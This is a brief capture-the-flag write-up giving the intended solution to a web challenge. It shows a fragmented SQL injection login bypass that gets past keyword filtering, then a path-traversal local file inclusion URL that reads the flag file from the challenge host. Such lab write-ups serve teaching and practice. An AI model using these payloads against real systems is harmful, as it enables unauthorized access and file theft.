# Bypassss

Bypass admin using fragmented SQL Injection and then Local File Inclusion:

## Intended PoC:

```
User: \
Pass: oorr/**/trutruee#
```

And then continued by Local File Inclusion

http://ctf.tcp1p.com:45679/viewer.php?image=images/...//...//...//...//...//flag.txt

## Reference:
* https://www.invicti.com/blog/web-security/fragmented-sql-injection-attacks/